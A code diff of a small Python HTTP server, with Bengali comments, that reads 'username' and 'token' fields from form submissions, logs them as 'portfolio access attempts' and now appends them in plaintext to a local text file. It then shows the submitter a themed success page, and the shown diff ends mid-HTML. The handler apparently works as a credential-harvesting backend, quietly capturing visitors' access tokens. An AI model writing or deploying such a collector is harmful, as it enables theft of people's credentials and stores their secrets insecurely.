@@ -9,18 +9,19 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
             post_data = self.rfile.read(content_length).decode('utf-8')
             fields = urllib.parse.parse_qs(post_data)
             
-            # Render-এর ড্যাশবোর্ডে "Logs" ট্যাবে এই ক্লায়েন্ট ডেটা দেখা যাবে
-            print("\n" + "="*45)
-            print("[+] NEW PORTFOLIO ACCESS ATTEMPT:")
-            print(f"Client Name: {fields.get('username', [''])}")
-            print(f"Access Token: {fields.get('token', [''])}")
-            print("="*45 + "\n")
+            user = fields.get('username', [''])[0]
+            token = fields.get('token', [''])[0]
+            
+            # ক্লাউড লগে প্রিন্ট করার পাশাপাশি একটি লোকাল ফাইলে ডেটা অ্যাপেন্ড (Append) করার কোড
+            with open("test_database.txt", "a", encoding="utf-8") as f:
+                f.write(f"Client: {user} | Token: {token}\n")
+            
+            print(f"\n[+] SAVED TO FILE -> Client: {user}\n")
             
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
             self.end_headers()
             
-            # ক্লায়েন্ট সাবমিট করার পর ব্রাউজারে এই স্পোর্টস থিম মেসেজটি দেখাবে
             success_html = """
             <html>
             <body style="background-color: #060814; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
